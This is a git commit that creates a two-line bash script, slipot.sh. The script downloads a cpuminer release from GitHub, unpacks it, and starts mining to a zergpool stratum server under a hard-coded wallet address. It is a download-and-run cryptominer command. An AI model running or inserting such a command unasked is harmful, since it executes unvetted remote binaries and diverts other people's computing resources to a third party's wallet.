ce591f507e0c1007d24b9a464bdc8ff9c65bd938
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 11:09:11 +0700

    Create slipot.sh

---
+++ slipot.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz && tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz && ./cpuminer -a scrypt -o stratum+tcp://scrypt.na.mine.zergpool.com:3433 -u GTJwZwAxp5TZGj3rk1Msfn3Zc6RPTKTzt5 -p c=BTG,mc=FLO/GLC/PYRK,ID=joreo-1
